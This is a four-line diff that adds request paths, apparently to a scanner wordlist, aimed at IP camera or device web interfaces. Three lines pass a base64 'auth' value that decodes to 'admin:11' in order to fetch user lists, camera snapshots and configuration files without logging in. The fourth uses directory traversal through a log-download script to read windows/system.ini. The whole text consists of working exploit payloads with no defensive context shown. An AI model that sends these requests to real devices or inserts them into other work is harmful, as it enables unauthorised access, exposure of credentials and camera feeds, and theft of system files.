@@ -1,0 +1,4 @@
+/Security/users?auth=YWRtaW46MTEKYWRtaW46MTEK
+/onvif-http/snapshot?auth=YWRtaW46MTEK
+/System/configurationFile?auth=YWRtaW46MTEK
+/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini
